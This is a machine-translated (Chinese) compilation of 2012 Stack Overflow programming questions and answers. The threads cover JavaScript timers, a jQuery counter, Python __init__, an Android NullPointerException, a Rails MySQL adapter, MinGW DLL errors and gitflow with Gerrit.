# StackOverflow 问答 13360000-13360999

# javascript - javascript中的回调函数

> ID：13360002
> 
> 赞同：0
> 
> 时间：2012-11-13T11:31:41.727
> 
> 标签：javascript, callback

这段代码有什么问题

```
var a=function()
{
   setInterval(function(){document.write("a");},1000);
}

function b(callback)
{
    callback();
    alert(2);
}

b(a); // alert 2 
```

它不应该向我显示警报，因为通话还没有结束？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T11:35:31.090

代码按预期运行。SetInterval 不会保留在指定时间后触发分配函数的其余代码的执行。

所以你会得到警报，然后是 document.write。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T11:39:03.810

您可以将回调添加到您的 setInterval 函数中，以便在 1000 毫秒延迟之后才执行它，例如：

```
 var a=function(callback) {
        setInterval(function(){document.write("a"); callback(); },1000);
    }

    function b() {
        alert(2);
    }

a(b); // alert 2 AFTER the 1000 millisecond delay 
```

# ios - 具有自定义边距的 UIWebView 文档（原为：未按预期滚动）

> ID：13360003
> 
> 赞同：0
> 
> 时间：2012-11-13T11:31:43.847
> 
> 标签：ios, xcode, uiwebview, scroll, margins

-EDIT- 我刚刚在横向模式下创建了一个测试文档，它显示得很好。我正在使用的文档似乎有自定义边距，比正常情况要小。有没有办法调整此类文档的显示方式，以便可以在屏幕上查看所有文本？/-编辑-

我有一段代码来显示一个 .doc 文档，它处于横向模式：

```
- (void)viewDidLoad
{
   [super viewDidLoad];   
   _myWebView = [[UIWebView alloc] initWithFrame:CGRectMake(0, 0, 320, 760)];   
   NSURL *myUrl = [NSURL URLWithString:@"http://pathToDoc/myDoc.doc"];  
   NSURLRequest *myRequest = [NSURLRequest requestWithURL:myUrl];
   [_myWebView loadRequest:myRequest];    
   [self.view addSubview:_myWebView];
} 
```

但是，这会在可滚动视图中显示文档；完全向右滚动，文档的一部分被截断，这意味着不是所有的文本都可以阅读。

谁能解释为什么会这样？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T16:51:32.440

只用了几个月，但我最终到达了那里。缺少的就是这一行：

```
_myWebView.autoresizingMask = UIViewAutoresizingFlexibleWidth; 
```

# python - python类中的init__和__init__有什么区别？

> ID：13360005
> 
> 赞同：1
> 
> 时间：2012-11-13T11:31:48.693
> 
> 标签：python, class, methods, initialization

`__init__`如果我使用而不是`init__`在课堂上使用，[有些事情](https://stackoverflow.com/q/11899959/1329187)不起作用。我只是好奇这两者之间有什么区别。

这是课程的一部分。但这真的没关系，因为它适用`init__`于`__init__`. 我知道这是一个打字错误，那么这意味着我实际上可以以任何方式调用它。

```
class Point(namedtuple('Point', 'x, y, z')):
  'class of a point as a tuple array'
  __slots__ = () # prevent creation of instance dictionaries to save memory

  def init__(self, x, y, z):
    self.x = x
    self.y = y
    self.z = z

  def __del__(self):
    'delete the Point'

  def __repr__(self):
    'Return a nicely formatted representation string'
    return '[%r, %r, %r]' % (self)

  def __str__(self):
    'printing format'
    return '%s[%r, %r, %r]' % (self.__class__.__name__,
                               self.x, self.y, self.z)

  def __add__(self, other):
    return Point(self.x + other.x, self.y + other.y, self.z + other.z)

  def __sub__(self, other):
    return Point(self.x - other.x, self.y - other.y, self.z - other.z)

  def __mul__(self, scal):
    'multiplication ny scalar'
    return Point(self.x * scal, self.y * scal, self.z * scal)

  def __div__(self, scal):
    'division ny scalar'
    if scal != 0.0:
        return Point(self.x / scal, self.y / scal, self.z / scal)
    else:
        sys.exit('Division by zero!') 
```

我的问题是“如何以两种不同的方式实例化一个对象？” 这样它就可以完美地工作。

这要怎么解释？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-13T11:34:46.547

[`__init__`](http://docs.python.org/2/reference/datamodel.html#object.__init__)是用于初始化您的实例的钩子。（创建实例时总是调用它）。

`init__`只是一个名字很奇怪的类方法。

您需要向我们展示您的代码；如果当您有一个名为的方法时出现问题，那么`__init__`您在那里犯了一个错误。将其重命名为`init__`just 意味着它不会被自动调用，因此不会触发您的编码错误。

在[您引用的评论中](https://stackoverflow.com/questions/11899959/python-is-it-possible-to-instantiate-an-object-of-one-class-in-two-different-wa#comment15841610_11900405)，作者*确实*在他的评论中使用`__init__`了但忘记转义前导下划线，它们被解释为代码以开始粗体文本：

```
__this is bold__ 
```

变得**这就是大胆**。请注意，该评论`__`中`__main__` *也*丢失了尾随。

在您更新的代码中，您试图覆盖`__init__`元组（子类）的方法，这是一种特殊情况。通过将`__init__`方法重命名为`init__`您创建了一个*不同*的方法，并且根本没有遇到这个常见问题。

有关为什么这是一个问题的更多详细信息，请参阅[使用多个 __init__ 参数对 Python 元组进行子类化；](https://stackoverflow.com/questions/1565374/subclassing-python-tuple-with-multiple-init-arguments)你必须创建一个`__new__`方法。[`__new__`](http://docs.python.org/2/reference/datamodel.html#object.__new__)是创建实例的工厂方法，`__init__`然后初始化数据。但这不适用于不可变类型，例如`namedtuple`or `tuple`，因为您不应该在工厂创建实例后更改实例。

在这种特定情况下，您根本不需要一个`__init__`或一个`__new__`方法*，*因为`namedtuple`子类`Point`已经处理了`x`,`y`和`z`属性的初始化。通过重命名`__init__`为`init__`您使事情正常进行，但您最终会得到一个`init__`您永远不会使用的毫无意义的方法。只需删除它。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-13T11:34:39.760

`init__`在 Python 中没有特殊含义。这只是一种方法。

`__init__`是在对象实例化时自动调用的魔术方法。

如果`init__`有效但`__init__`无效，那么您的代码中出现了问题 - 可能在那个方法中，因为如果它被调用`init__`，它几乎肯定永远不会被调用。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-13T11:35:01.977

`__init__`是一个特殊的方法，它总是在创建类的新对象时调用。只有当您想要定义其他属性或以某种方式更改对象的行为时，它才应该被重载。

# javascript - 如何在jquery中计数，加减数字

> ID：13360007
> 
> 赞同：0
> 
> 时间：2012-11-13T11:31:54.107
> 
> 标签：javascript, jquery, numbers

我有这个小脚本。我需要在我的购物篮中添加和删除元素。所以我有一个简单的计数器，但它不能正常工作。当我解析实际数字并添加另一个数字时，一切都很好，但是 - 我不能添加另一个数字，当我减去它时，它会给我带来一个零。你能帮助我吗？我的代码和一些小提琴[http://jsfiddle.net/5vuJQ/](http://jsfiddle.net/5vuJQ/)：

```
$(function(products_counter){
    var n = parseInt($('.lce_number').text());
    var n_place = $('.lce_number');
    $('.lce_add').live('click', function(){
        n_place.empty().append(n + 1);
    });
    $('.lce_remove').live('click', function(){
        n_place.empty().append(n - 1);
    });
}); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T11:34:20.517

`.lce_number`您必须从每次点击中提取号码。请注意，`live()`方法已被弃用，您应该[`on()`](http://api.jquery.com/on/)改用。

```
var n_place = $('.lce_number');
$('.line_count_elements').on('click', '.lce_add', function() {
    var n = parseInt(n_place.text(), 10);
    n_place.html(n + 1);
});
$('.line_count_elements').on('click', '.lce_remove', function() {
    var n = parseInt(n_place.text(), 10);
    n_place.html(Math.max(0, n - 1));
});​ 
```

**演示：http:** [//jsfiddle.net/5vuJQ/7/](http://jsfiddle.net/5vuJQ/7/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T11:35:52.903

你可以试试这个：

[http://jsfiddle.net/5vuJQ/8/](http://jsfiddle.net/5vuJQ/8/)

```
$(function(products_counter){
        var n = parseInt($('.lce_number').text());
        var n_place = $('.lce_number');
        $('.lce_add').on('click', function(){
            n_place.empty().append(++n);
        });
        $('.lce_remove').on('click', function(){
            if(n>0)
              n_place.empty().append(--n);
        });
    });​ 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T11:36:25.680

```
$(function(products_counter){
    var n = parseInt($('.lce_number').text());
    $('.lce_add').live('click', function(){
       $('.lce_number').text(parseInt($('.lce_number').text())+1);
    });
    $('.lce_remove').live('click', function(){
         $('.lce_number').text(parseInt($('.lce_number').text())-1);
    });
}); 
```

演示在这里：http: [//jsfiddle.net/Zzbet/](http://jsfiddle.net/Zzbet/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-13T11:35:27.240

```
$(function(products_counter){
    var n_place = $('.lce_number');
    $('.lce_add').live('click', function(){
        var n = parseInt($('.lce_number').text());
        n_place.empty().append(n + 1);
    });
    $('.lce_remove').live('click', function(){
        var n = parseInt($('.lce_number').text())
        n_place.empty().append(n - 1);
    });
}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-13T11:36:12.980

```
$(function(products_counter){      
    var n_place = $('.lce_number');
    $('.lce_add').live('click', function(){
        var n = parseInt($('.lce_number').text());
        n_place.empty().append(n + 1);
    });
    $('.lce_remove').live('click', function(){
        var n = parseInt($('.lce_number').text());
        n_place.empty().append(n - 1);
    });
}); 
```

您需要`n`在每次点击后获取 的值！

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-11-13T11:39:14.853

```
$('.lce_add').live('click', function(){
        n_place.empty().append(n + 1);
    }); 
```

代码中的上述行**没有**修改“ **n** ”的值

**首先 -** n = 1
**在第一次单击**时- append(n + 1) --> 1+ 1 ---> 显示 2
***n****仍然是 1*
**在第二次单击**时- append(n + 1) --> 1 + 1 --> 再次导致 2
**n**仍然是 1，因此重复

您需要在调用 append()**之前修改 '** **n** '的值

 **```
 $('.lce_add').live('click', function(){
        n = n + 1;
        n_place.empty().append(n);
    }); 
```

[http://jsfiddle.net/5tbqX/1/](http://jsfiddle.net/5tbqX/1/)**

# android - 在 Android Activity 中得到 nullPointerException 并且不知道为什么以及如何解决它

> ID：13360010
> 
> 赞同：2
> 
> 时间：2012-11-13T11:32:10.910
> 
> 标签：android, nullpointerexception, android-activity, runtime-error, logcat

我正在尝试编写一个小井字游戏。现在我到了一个点，它抛出了一个我无法解释的 nullPointerException。任何人都可以帮忙吗？

代码主要活动：

```
 package de.android.pali;

    import android.app.Activity;
    import android.content.Intent;
    import android.os.Bundle;
    import android.view.View;
    import android.view.View.OnClickListener;
    import android.widget.Button;

    public class TicTacToeMenu extends Activity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_tic_tac_toe_menu);

    final Button createGame = (Button)findViewById(R.id.newGameButton);

    final Intent newGame = new Intent(TicTacToeMenu.this, newGame.class);

    createGame.setOnClickListener(new OnClickListener() {

        @Override
        public void onClick(View v) {

            startActivity(newGame);

        }
    });

}

} 
```

第二个活动的代码：

```
package de.android.pali;

import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.ImageButton;
import android.widget.TextView;

public class newGame extends TicTacToeMenu{

int turn = 1;
int[] felder = new int[9];
TextView ergebnis = (TextView)findViewById(R.id.winners);

public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.game);

    final ImageButton feld1 = (ImageButton)findViewById(R.id.feld1);
    final ImageButton feld2 = (ImageButton)findViewById(R.id.feld2);
    final ImageButton feld3 = (ImageButton)findViewById(R.id.feld3);
    final ImageButton feld4 = (ImageButton)findViewById(R.id.feld4);
    final ImageButton feld5 = (ImageButton)findViewById(R.id.feld5);
    final ImageButton feld6 = (ImageButton)findViewById(R.id.feld6);
    final ImageButton feld7 = (ImageButton)findViewById(R.id.feld7);
    final ImageButton feld8 = (ImageButton)findViewById(R.id.feld8);
    final ImageButton feld9 = (ImageButton)findViewById(R.id.feld9);

    feld1.setOnClickListener(new OnClickListener() {

        @Override
        public void onClick(View v) {

            if(turn==1){
            feld1.setBackgroundResource(R.drawable.kreis);
            turn = 0;
            felder[0] = 1;
            }
            else{
                feld1.setBackgroundResource(R.drawable.kreuz);
                turn = 1;
                felder[0] = 0;
            }
        }

    });

    feld2.setOnClickListener(new OnClickListener() {

        @Override
        public void onClick(View v) {

            if(turn==1){
                feld2.setBackgroundResource(R.drawable.kreis);
                turn = 0;
                felder[1] = 1;
                }
                else{
                        feld2.setBackgroundResource(R.drawable.kreuz);
                    felder[1] = 0;
                }
        }
    });

    feld3.setOnClickListener(new OnClickListener() {

        @Override
        public void onClick(View v) {
            if(turn==1){
                feld3.setBackgroundResource(R.drawable.kreis);
                turn = 0;
                felder[2] = 1;
                }
                else{
                    feld3.setBackgroundResource(R.drawable.kreuz);
                    turn = 1;
                    felder[2] = 0;
                };

        }
    });

    feld4.setOnClickListener(new OnClickListener() {

        @Override
        public void onClick(View v) {

            if(turn==1){
                feld4.setBackgroundResource(R.drawable.kreis);
                turn = 0;
                felder[3] = 1;
                }
                else{
                    feld4.setBackgroundResource(R.drawable.kreuz);
                    felder[3] = 0;
                }

        }
    });

    feld5.setOnClickListener(new OnClickListener() {

        @Override
        public void onClick(View v) {

            if(turn==1){
                feld5.setBackgroundResource(R.drawable.kreis);
                turn = 0;
                felder[4] = 1;
                }
                else{
                    feld5.setBackgroundResource(R.drawable.kreuz);
                    turn = 1;
                    felder[4] = 0;
                }

        }
    });

    feld6.setOnClickListener(new OnClickListener() {

        @Override
        public void onClick(View v) {

            if(turn==1){
                feld6.setBackgroundResource(R.drawable.kreis);
                turn = 0;
                felder[5] = 1;
                }
                else{
                    feld6.setBackgroundResource(R.drawable.kreuz);
                    turn = 1;
                    felder[5] = 0;
                }

        }
    });

    feld7.setOnClickListener(new OnClickListener() {

        @Override
        public void onClick(View v) {

            if(turn==1){
                feld7.setBackgroundResource(R.drawable.kreis);
                turn = 0;
                felder[6] = 1;
                }
                else{
                    feld7.setBackgroundResource(R.drawable.kreuz);
                    turn = 1;
                    felder[6] = 0;
                }

        }
    });

    feld8.setOnClickListener(new OnClickListener() {

        @Override
        public void onClick(View v) {

            if(turn==1){
                feld8.setBackgroundResource(R.drawable.kreis);
                turn = 0;
                felder[7] = 1;
                }
                else{
                    feld8.setBackgroundResource(R.drawable.kreuz);
                    turn = 1;
                    felder[7] = 0;
                }

        }
    });

    feld9.setOnClickListener(new OnClickListener() {

        @Override
        public void onClick(View v) {

            if(turn==1){
                feld9.setBackgroundResource(R.drawable.kreis);
                turn = 0;
                felder[8] = 1;
                }
                else{
                    feld9.setBackgroundResource(R.drawable.kreuz);
                    turn = 1;
                    felder[8] = 0;
                }

        }
    });

}

public int getTurn() {
    int whois = turn;
    return whois;
}

public void checkWinner(){
    if(felder[0]==1 & felder[1]==1 & felder[2]==1){
        ergebnis.setText(R.string.kreuz);

    }else
    { }

}
} 
```

日志猫：

```
 11-13 12:26:55.579: I/ActivityManager(88): START {act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] flg=0x10000000 cmp=de.android.pali/.TicTacToeMenu} from pid 772
11-13 12:26:55.589: W/WindowManager(88): Failure taking screenshot for (180x300) to layer 21005
11-13 12:26:55.629: D/AndroidRuntime(772): Shutting down VM
11-13 12:26:55.639: D/dalvikvm(772): GC_CONCURRENT freed 101K, 77% free 485K/2048K, paused 1ms+1ms
11-13 12:26:55.649: D/dalvikvm(772): Debugger has detached; object registry had 1 entries
11-13 12:26:55.659: D/dalvikvm(782): Not late-enabling CheckJNI (already on)
11-13 12:26:55.669: I/AndroidRuntime(772): NOTE: attach of thread 'Binder Thread #3' failed
11-13 12:26:55.719: I/ActivityManager(88): Start proc de.android.pali for activity de.android.pali/.TicTacToeMenu: pid=782 uid=10045 gids={}
11-13 12:26:55.948: W/NetworkManagementSocketTagger(88): setKernelCountSet(10045, 1) failed with errno -2
11-13 12:26:56.449: I/Process(88): Sending signal. PID: 782 SIG: 3
11-13 12:26:56.449: I/dalvikvm(782): threadid=3: reacting to signal 3
11-13 12:26:56.569: I/dalvikvm(782): Wrote stack traces to '/data/anr/traces.txt'
11-13 12:26:56.819: D/gralloc_goldfish(782): Emulator without GPU emulation detected.
11-13 12:26:56.868: I/ActivityManager(88): Displayed de.android.pali/.TicTacToeMenu: +1s263ms (total +37s914ms)
11-13 12:26:57.088: W/NetworkManagementSocketTagger(88): setKernelCountSet(10009, 0) failed with errno -2
11-13 12:27:00.828: I/ActivityManager(88): START {cmp=de.android.pali/.newGame} from pid 782
11-13 12:27:00.838: W/WindowManager(88): Failure taking screenshot for (180x300) to layer 21010
11-13 12:27:00.868: D/AndroidRuntime(782): Shutting down VM
11-13 12:27:00.868: W/dalvikvm(782): threadid=1: thread exiting with uncaught exception (group=0x409c01f8)
11-13 12:27:00.889: E/AndroidRuntime(782): FATAL EXCEPTION: main
11-13 12:27:00.889: E/AndroidRuntime(782): java.lang.RuntimeException: Unable to instantiate activity ComponentInfo{de.android.pali/de.android.pali.newGame}: java.lang.NullPointerException
11-13 12:27:00.889: E/AndroidRuntime(782):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1880)
11-13 12:27:00.889: E/AndroidRuntime(782):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1981)
11-13 12:27:00.889: E/AndroidRuntime(782):  at android.app.ActivityThread.access$600(ActivityThread.java:123)
11-13 12:27:00.889: E/AndroidRuntime(782):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1147)
11-13 12:27:00.889: E/AndroidRuntime(782):  at android.os.Handler.dispatchMessage(Handler.java:99)
11-13 12:27:00.889: E/AndroidRuntime(782):  at android.os.Looper.loop(Looper.java:137)
11-13 12:27:00.889: E/AndroidRuntime(782):  at android.app.ActivityThread.main(ActivityThread.java:4424)
11-13 12:27:00.889: E/AndroidRuntime(782):  at java.lang.reflect.Method.invokeNative(Native Method)
11-13 12:27:00.889: E/AndroidRuntime(782):  at java.lang.reflect.Method.invoke(Method.java:511)
11-13 12:27:00.889: E/AndroidRuntime(782):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
11-13 12:27:00.889: E/AndroidRuntime(782):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
11-13 12:27:00.889: E/AndroidRuntime(782):  at dalvik.system.NativeStart.main(Native Method)
11-13 12:27:00.889: E/AndroidRuntime(782): Caused by: java.lang.NullPointerException
11-13 12:27:00.889: E/AndroidRuntime(782):  at android.app.Activity.findViewById(Activity.java:1794)
11-13 12:27:00.889: E/AndroidRuntime(782):  at de.android.pali.newGame.<init>(newGame.java:13)
11-13 12:27:00.889: E/AndroidRuntime(782):  at java.lang.Class.newInstanceImpl(Native Method)
11-13 12:27:00.889: E/AndroidRuntime(782):  at java.lang.Class.newInstance(Class.java:1319)
11-13 12:27:00.889: E/AndroidRuntime(782):  at android.app.Instrumentation.newActivity(Instrumentation.java:1023)
11-13 12:27:00.889: E/AndroidRuntime(782):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1871)
11-13 12:27:00.889: E/AndroidRuntime(782):  ... 11 more
11-13 12:27:00.929: W/ActivityManager(88):   Force finishing activity de.android.pali/.newGame
11-13 12:27:00.929: W/ActivityManager(88):   Force finishing activity de.android.pali/.TicTacToeMenu
11-13 12:27:01.359: I/Process(88): Sending signal. PID: 782 SIG: 3
11-13 12:27:01.359: I/dalvikvm(782): threadid=3: reacting to signal 3
11-13 12:27:01.379: I/dalvikvm(782): Wrote stack traces to '/data/anr/traces.txt'
11-13 12:27:01.439: W/ActivityManager(88): Activity pause timeout for ActivityRecord{415b08b0 de.android.pali/.newGame}
11-13 12:27:01.439: I/Process(88): Sending signal. PID: 782 SIG: 3
11-13 12:27:01.439: I/dalvikvm(782): threadid=3: reacting to signal 3
11-13 12:27:01.459: I/dalvikvm(782): Wrote stack traces to '/data/anr/traces.txt'
11-13 12:27:01.488: W/NetworkManagementSocketTagger(88): setKernelCountSet(10009, 1) failed with errno -2
11-13 12:27:01.748: W/NetworkManagementSocketTagger(88): setKernelCountSet(10045, 0) failed with errno -2
11-13 12:27:02.169: I/Process(782): Sending signal. PID: 782 SIG: 9
11-13 12:27:02.178: I/ActivityManager(88): Process de.android.pali (pid 782) has died.
11-13 12:27:02.178: W/InputDispatcher(88): channel '415c53c8 de.android.pali/de.android.pali.TicTacToeMenu (server)' ~ Consumer closed input channel or an error occurred.  events=0x8
11-13 12:27:02.178: E/InputDispatcher(88): channel '415c53c8 de.android.pali/de.android.pali.TicTacToeMenu (server)' ~ Channel is unrecoverably broken and will be disposed!
11-13 12:27:02.189: I/WindowManager(88): WIN DEATH: Window{415c53c8 de.android.pali/de.android.pali.TicTacToeMenu paused=true}
11-13 12:27:02.189: W/InputDispatcher(88): Attempted to unregister already unregistered input channel '415c53c8 de.android.pali/de.android.pali.TicTacToeMenu (server)'
11-13 12:27:02.199: I/WindowManager(88): WINDOW DIED Window{415c53c8 de.android.pali/de.android.pali.TicTacToeMenu paused=true}
11-13 12:27:02.359: W/InputManagerService(88): Got RemoteException sending setActive(false) notification to pid 782 uid 10045
11-13 12:27:11.749: W/ActivityManager(88): Activity destroy timeout for  ActivityRecord{415a28b8 de.android.pali/.TicTacToeMenu}
11-13 12:27:11.749: W/ActivityManager(88): Activity destroy timeout for ActivityRecord{415b08b0 de.android.pali/.newGame} 
```

我希望任何人都可以提供帮助:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T11:35:05.990

把这一行：

```
TextView ergebnis = (TextView)findViewById(R.id.winners); 
```

之后`setContentView()`。

该`findViewById()`方法仅在您的内容设置后才有效。您的应用程序正在尝试以您实施的这种方式在类加载期间找到视图。

PS：有一个Java约定，规定类名必须以大写字母开头。您应该将“newGame”重命名为“NewGame”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T11:37:10.410

logcat 的这一行显示了代码中错误的位置：

```
11-13 12:27:00.889: E/AndroidRuntime(782):  at de.android.pali.newGame.<init>(newGame.java:13) 
```

这似乎与此有关：

```
feld1.setOnClickListener(new OnClickListener() {

    @Override
    public void onClick(View v) {
.... 
```

出于某种原因，`feld1`当您调用`final ImageButton feld1 = (ImageButton)findViewById(R.id.feld1);`. 您确定这是该布局文件（游戏）上 ImageButton 的正确 ID 吗？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-06T13:21:03.943

嗨，兄弟，只需尝试使用 try{ ... } 和 catch{ ... } 编写您的代码，这样您就可以轻松找到异常。

# php - 字符串替换一行中的三个字符

> ID：13360012
> 
> 赞同：2
> 
> 时间：2012-11-13T11:32:18.323
> 
> 标签：php, javascript, jquery, replace, str-replace

我所拥有的是`"text - something else`“，现在我可以使用下面的代码将其转换为`"text-something-else"`，但我对额外的替换不满意。

反正有没有合并成一行？

**PHP：**

```
$url = strtolower(str_replace(" ", "-", splitstring($item->item)));
$url = str_replace("---", "-", $url); 
```

**JS：**

```
title = title.toLowerCase().replace(/ /g, '-');
title = title.replace(/---/g, '-'); 
```

后者替换了防止这个：`"text---something-else"`，所以他们是需要的。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-13T11:38:36.900

使用正则表达式的力量：

```
preg_replace('/[ -]+/', '-', $str); 
```

或者：

```
str.replace(/[ -]+/g, '-'); 
```

以上显然会用单数连字符替换任意数量的连字符或空格，这与您之前的逻辑略有不同。如果您想考虑任何其他字符，您可以轻松地执行以下操作：

```
/[\s_-]+/ 
```

以上将匹配任何空格、连字符或下划线。

作为在正则表达式中使用连字符时的警告，您应该确保它位于`[bracketed]`组的末尾，`[abc-]`否则您需要使用反斜杠将其转义，例如`[a\-bc]`. 这是因为正则表达式语法允许您匹配范围，例如`0-9`在这种情况下您不想要的范围。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T11:42:50.410

试试（我没有测试过）：

```
// php
$what_to_replace = array(" - ", " ");

// should process " - " first, so spaces around "-" should not be replaced twice
$url = strtolower(str_replace($what_to_replace, "-", splitstring($item->item))); 
```

看[例子](http://php.net/manual/en/function.str-replace.php)

# mysql - 如何解决 请安装 mysql 适配器：`gem install activerecord-mysql-adapter`（没有要加载的文件--java）

> ID：13360013
> 
> 赞同：2
> 
> 时间：2012-11-13T11:32:23.247
> 
> 标签：mysql, ruby-on-rails, rake

我很难找到解决这个问题的方法。我收到错误：

```
rake db:migrate
(in /home/EXPRESS.LOCAL/shevchenko/web/tmp)
DEPRECATION WARNING: Rake tasks in vendor/plugins/paperclip/tasks and vendor/plugins/restful-authentication/tasks are deprecated. Use lib/tasks instead. (called from /home/EXPRESS.LOCAL/shevchenko/.rvm/gems/ruby-1.8.7-p371/gems/rails-2.3.8/lib/tasks/rails.rb:10)
rake aborted!
Please install the mysql2 adapter: `gem install activerecord-mysql2-adapter` (no such file to load -- java) 
```

我正在尝试卸载 rake 0.9.2.2 并安装 0.8.7，然后将适配器：mysql 更改为适配器：mysql2。

这是我的宝石：

```
bundle show
Gems included by the bundle:
  * actionmailer (2.3.8)
  * actionpack (2.3.8)
  * activerecord (2.3.8)
  * activerecord-jdbc-adapter (1.2.2.1)
  * activerecord-jdbcmysql-adapter (1.2.2.1)
  * activeresource (2.3.8)
  * activesupport (2.3.8)
  * bundler (1.2.1)
  * jdbc-mysql (5.1.13)
  * mysql2 (0.3.6)
  * rack (1.1.3)
  * rails (2.3.8)
  * rake (0.8.7) 
```

这是 gem 环境输出：

```
RubyGems Environment:
  - RUBYGEMS VERSION: 1.4.2
  - RUBY VERSION: 1.8.7 (2012-10-12 patchlevel 371) [i686-linux]
  - INSTALLATION DIRECTORY: /home/EXPRESS.LOCAL/shevchenko/.rvm/gems/ruby-1.8.7-p371
  - RUBY EXECUTABLE: /home/EXPRESS.LOCAL/shevchenko/.rvm/rubies/ruby-1.8.7-p371/bin/ruby
  - EXECUTABLE DIRECTORY: /home/EXPRESS.LOCAL/shevchenko/.rvm/gems/ruby-1.8.7-p371/bin
  - RUBYGEMS PLATFORMS:
    - ruby
    - x86-linux
  - GEM PATHS:
     - /home/EXPRESS.LOCAL/shevchenko/.rvm/gems/ruby-1.8.7-p371
     - /home/EXPRESS.LOCAL/shevchenko/.rvm/gems/ruby-1.8.7-p371@global
  - GEM CONFIGURATION:
     - :update_sources => true
     - :verbose => true
     - :benchmark => false
     - :backtrace => false
     - :bulk_threshold => 1000
     - REMOTE SOURCES:
     - http://rubygems.org/ 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T11:55:23.097

也许这是因为 gem 的版本`mysql2`，请编辑您的`Gemfile`：

```
gem "mysql2", "0.2.6" 
```

并运行 bundle install 并再次运行 migrate。

# c++ - “程序入口点 _ZNSt8_detail15_List_node_base7_M_hookEPS0_ 无法位于动态链接库 libstdc -6.dll 中。”

> ID：13360014
> 
> 赞同：6
> 
> 时间：2012-11-13T11:32:36.810
> 
> 标签：c++, mingw, libstdc++

有一个小问题。我有 c++ 代码，它链接到一些库。我以前有源代码中的（原始）exe，并且可以在第一台机器上完美运行。还有第二台机器，我在其中处理源代码，更改它等。在第二台机器上，该源代码的构建工作正常，当我复制 second.exe 并尝试在第一台机器上运行它时它显示错误消息

> “程序入口点_ZNSt8_detail15_List_node_base7_M_hookEPS0_不能位于动态链接库libstdc++-6.dll中。”

有一件事，second.exe 与 original.exe 复制在同一个文件夹中，所以它应该看到 ddl，因为原始 dll 与 original.exe 在同一个文件夹中，不是吗？它是用 MinGW 编译的，在 NetBeans 和项目属性中工作，有库添加（通过添加库文件）但 libstdc++-6.dll 没有添加。libstdc++-6.dll 位于 original.exe 所在的文件夹中

谢谢

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-21T16:49:32.970

我在 XP 中使用 MingW 时遇到了非常相似的问题。

我使用 mingW 编译了一个 12 klines C++ 项目；它在 MSYS 中运行良好，但在本地 cmd shell 中调用时失败，声称在 libstdc++-6.dll 中缺少入口点 Z_St8_detail15_and_so_on。

相反，下面的简单程序同时在 MSYS 和 cmd 中运行：

```
#include <iostream>

using namespace std ;

class Hello {
  public:
  Hello() { cout << "Hello !" << endl ; }
} ;

Hello hello ;

int main (void) {} 
```

它必须针对 libstdc++ (gcc -o hello hello.cpp -lstdc++) 进行编译，如果省略 -lstdc++，编译当然会失败。因此，名称修改可能不是唯一的问题。

我在资源管理器中搜索了 libstdc++-6.dll，发现我的系统上有两个：一个安装在 migw32 中，另一个之前由拥有自己的 lib 版本的程序安装在其目录中。但是，它修改了 PATH 以便首先找到它的库！

我在当前 shell 的 PATH 开头插入了 Mingw 所在的路径。喜欢：

```
set PATH=C:\mingw\bin;D:\msys\1.0\local\bin;%PATH% 
```

现在一切正常！

* * *

马丁，我不能写你的评论，所以我编辑我的信息：你是对的。此处解释了 windows 如何查找 DLL：

[http://msdn.microsoft.com/en-en/library/7d83bc18%28v=vs.80%29.aspx](http://msdn.microsoft.com/en-en/library/7d83bc18%28v=vs.80%29.aspx)

干杯

# git - 将 gitflow 功能分支发布到 gerrit

> ID：13360017
> 
> 赞同：3
> 
> 时间：2012-11-13T11:32:40.627
> 
> 标签：git, branch, push, gerrit, git-flow

我使用 Gerrit 和 gitflow，我想将我的 giflow 功能分支推送到 Gerrit。当我使用一个简单的

```
git flow feature publish feature_name 
```

Gerrit 拒绝推送，因为我试图推送到**feature/feature_name**分支，这是不允许的。我想改为推送到**refs/for/feature/feature_name**并创建此远程分支（如果它不存在）。

在我的 git 配置中，我尝试设置

```
[branch "feature/feature_name"]
    merge = refs/for/feature/feature_name 
```

但是当我使用 gitflow 发布时，这个设置会被忽略。

有没有办法使用 gitflow 的*功能发布*命令设置远程分支？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T14:30:15.907

我和我的一位同事对 git-flow 进行了一些更改，因此它可以与 gerrit 一起使用，不幸的是您必须在某些分支区域拥有强制推送权限，但除此之外它可以正常工作

我可以和我的同事谈谈，然后我们可以发布分叉

我将开始取出公司特定的源并推回一个 fork 到 github 北京时间周二早上

最后你可以签出这个 git-flow 的分支[https://github.com/RasmusVoss/gitflow](https://github.com/RasmusVoss/gitflow)

您需要阅读一些项目。[https://github.com/RasmusVoss/gitflow/wiki](https://github.com/RasmusVoss/gitflow/wiki)

